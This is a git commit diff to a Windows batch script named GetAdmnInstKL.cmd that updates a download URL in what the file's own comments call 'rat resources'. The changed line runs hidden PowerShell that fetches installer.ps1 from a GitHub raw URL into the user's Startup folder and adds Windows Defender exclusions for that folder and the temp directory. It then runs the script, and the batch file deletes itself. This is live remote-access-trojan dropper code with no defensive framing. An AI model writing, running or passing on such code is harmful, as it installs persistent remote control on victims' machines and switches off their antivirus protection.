0c05f556f47bd6e5783ba7574b11b9f9df4b9027
jfrdgh <162196506+jfrdgh@users.noreply.github.com>
2024-03-10 02:03:06 +0000

    made download links great again

--- files/GetAdmnInstKL.cmd
+++ files/GetAdmnInstKL.cmd
@@ -37,7 +37,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention/main/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"; ./installer.ps1
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE/main/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"; ./installer.ps1
 
 @REM self delete
 del GetAdmnInstKL.cmd
